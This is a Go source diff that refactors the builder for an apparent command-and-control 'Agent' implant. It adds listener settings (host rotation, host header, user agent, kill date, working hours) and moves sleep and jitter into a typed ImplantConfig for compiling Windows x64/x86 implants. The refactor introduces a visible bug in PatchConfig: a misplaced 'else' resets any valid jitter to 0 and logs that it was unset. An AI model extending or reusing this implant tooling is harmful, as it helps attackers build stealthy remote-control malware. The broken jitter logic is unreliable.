@@ -62,6 +62,19 @@ const (
 	ARCHITECTURE_X86 = 2
 )
 
+type ListenerConfig struct {
+	Name         string   `json:"Name"`
+	Method       string   `json:"Method"`
+	UserAgent    string   `json:"UserAgent"`
+	Headers      []string `json:"Headers"`
+	HostHeader   string   `json:"HostHeader"`
+	Secure       bool     `json:"Secure"`
+	HostRotation string   `json:"HostRotation"`
+	Hosts        []string `json:"Hosts"`
+	KillDate     int64    `json:"KillDate"`
+	WorkingHours string   `json:"WorkingHours"`
+}
+
 type BuilderConfig struct {
 	Compiler64 string
 	Compiler86 string
@@ -100,11 +113,12 @@ type AgentBuilder struct {
 		ReplaceStringsX86 map[string]string
 	}
 
-	config struct {
-		Arch           int
-		ListenerType   int
-		ListenerConfig any
-		Config         map[string]any
+	ImplantConfig struct {
+		Arch           int            `json:"Arch"`
+		ListenerType   int            `json:"ListenerType"`
+		ListenerConfig ListenerConfig `json:"ListenerConfig"`
+		Sleep          string         `json:"Sleep"`
+		Jitter         string         `json:"Jitter"`
 	}
 
 	ImplantOptions struct {
@@ -134,7 +148,7 @@ func NewImplantBuilder(config BuilderConfig, path string) *AgentBuilder {
 	var builder = new(AgentBuilder)
 
 	builder.sourcePath = path + "/" + PayloadDir + "/" + "Agent" + "/"
-	builder.config.Arch = ARCHITECTURE_X64
+	builder.ImplantConfig.Arch = ARCHITECTURE_X64
 
 	builder.compilerOptions.SourceDirs = []string{
 		"src/agent",
@@ -243,7 +257,7 @@ func (ab *AgentBuilder) Build() bool {
 	ab.compilerOptions.Defines = append(ab.compilerOptions.Defines, "CONFIG_BYTES="+ConfigByteString)
 	log.Println("[info] Config Bytes: ", ConfigByteString)
 
-	if ab.config.Arch == ARCHITECTURE_X64 {
+	if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
 		abs, err := filepath.Abs(ab.compilerOptions.Config.Compiler64)
 		if err != nil {
 			log.Println("[error] attempting to get absolute path for compiler: ", err)
@@ -273,12 +287,12 @@ func (ab *AgentBuilder) Build() bool {
 
 			// only add the assembly if the agent is x64
 			if path.Ext(f.Name()) == ".asm" {
-				if (strings.Contains(f.Name(), ".x64.") && ab.config.Arch == ARCHITECTURE_X64) ||
-					(strings.Contains(f.Name(), ".x86.") && ab.config.Arch == ARCHITECTURE_X86) {
+				if (strings.Contains(f.Name(), ".x64.") && ab.ImplantConfig.Arch == ARCHITECTURE_X64) ||
+					(strings.Contains(f.Name(), ".x86.") && ab.ImplantConfig.Arch == ARCHITECTURE_X86) {
 					rand_name, _ := Crypt.GenerateRandomString(10)
 					AsmObj := ab.CompileDir + rand_name + ".o"
 					var AsmCompileStr string
-					if ab.config.Arch == ARCHITECTURE_X64 {
+					if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
 						AsmCompileStr = fmt.Sprintf(ab.compilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj)
 					} else {
 						AsmCompileStr = fmt.Sprintf(ab.compilerOptions.Config.Nasm+" -f win32 %s -o %s", FilePath, AsmObj)
@@ -310,7 +324,7 @@ func (ab *AgentBuilder) Build() bool {
 
 	switch ab.FileType { // will only by exe for now
 	case FILETYPE_WINDOWS_EXE:
-		if ab.config.Arch == ARCHITECTURE_X64 {
+		if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
 			CompilerCommand += "-D MAIN_THREADED -e main"
 		} else {
 			CompilerCommand += "-D MAIN_THREADED -e _main"
@@ -342,23 +356,19 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 		err error
 	)
 
-	if val, ok := ab.config.Config["Sleep"].(string); ok {
-		Sleep, err = strconv.Atoi(val)
-		if err != nil {
-			log.Println("[error] failed to convert sleep value to int: ", err)
-			return nil, err
-		}
+	Sleep, err = strconv.Atoi(ab.ImplantConfig.Sleep)
+	if err != nil {
+		log.Println("[error] failed to convert sleep value to int: ", err)
+		return nil, err
 	}
 
-	if val, ok := ab.config.Config["Jitter"].(string); ok {
-		Jitter, err = strconv.Atoi(val)
-		if err != nil {
-			log.Println("[error] failed to convert jitter value to int: ", err)
-			return nil, err
-		}
-		if Jitter < 0 || Jitter > 100 {
-			return nil, errors.New("jitter value must be between 0 and 100")
-		}
+	Jitter, err = strconv.Atoi(ab.ImplantConfig.Jitter)
+	if err != nil {
+		log.Println("[error] failed to convert jitter value to int: ", err)
+		return nil, err
+	}
+	if Jitter < 0 || Jitter > 100 {
+		return nil, errors.New("jitter value must be between 0 and 100")
 	} else {
 		log.Println("[warning] jitter value not set, defaulting to 0")
 		Jitter = 0
@@ -367,10 +377,10 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 	AgentConfig.AddInt(Sleep)
 	AgentConfig.AddInt(Jitter)
 
-	switch ab.config.ListenerType {
+	switch ab.ImplantConfig.ListenerType {
 	case TSCommon.HTTP_SERVER:
 		var (
-			Config = ab.config.ListenerConfig.(*TSCommon.ListenerConfig)
+			Config = ab.ImplantConfig.ListenerConfig
 			err    error
 		)
 		AgentConfig.AddInt64(Config.KillDate)
@@ -470,7 +480,7 @@ func (ab *AgentBuilder) CompileCmd(cmd string) bool {
 func (ab *AgentBuilder) GetListenerDefinitons() []string {
 	var def []string
 
-	switch ab.config.ListenerType {
+	switch ab.ImplantConfig.ListenerType {
 	case TSCommon.HTTP_SERVER:
 		def = append(def, "TRANSPORT_HTTP")
 		break
